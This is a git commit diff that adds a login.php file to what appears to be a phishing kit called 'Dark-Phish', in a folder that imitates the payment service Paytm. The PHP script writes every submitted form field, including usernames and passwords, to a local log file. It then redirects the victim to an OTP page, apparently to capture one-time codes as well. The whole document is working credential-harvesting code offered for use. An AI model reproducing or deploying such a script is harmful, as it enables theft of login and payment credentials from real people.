5b50d362565ce58090c1f6771df75466c1a28333
hopekinzs <Jimmyhopekinzs@gmail.com>
2025-09-12 19:46:27 +0300

    Add all tools contents

---
+++ tools/Dark-Phish/core/sites/Paytm/login.php
@@ -0,0 +1,13 @@
+<?php
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n\n");
+fclose($handle);
+header("Location: otp.html");
+exit;
+?>
